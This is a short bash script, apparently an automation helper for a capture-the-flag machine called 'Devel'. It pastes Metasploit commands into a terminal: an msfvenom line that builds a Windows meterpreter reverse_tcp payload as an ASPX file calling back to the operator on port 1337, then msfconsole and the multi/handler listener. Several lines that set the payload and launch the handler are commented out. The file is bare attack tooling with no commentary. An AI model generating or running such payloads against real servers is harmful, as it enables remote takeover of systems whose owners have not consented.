#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

command='msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=1337 -f aspx > devel.aspx'
paste_command "${command}"


command='msfconsole'
paste_command "${command}"

command='use multi/handler'
paste_command "${command}"

#command='set payload windows/meterpreter/reverse_tcp'
#paste_command "${command}"

#command='set lhost tun0'
#paste_command "${command}"

#command='set lport'
#paste_command "${command}"

#command='exploit -j'
#paste_command "${command}"
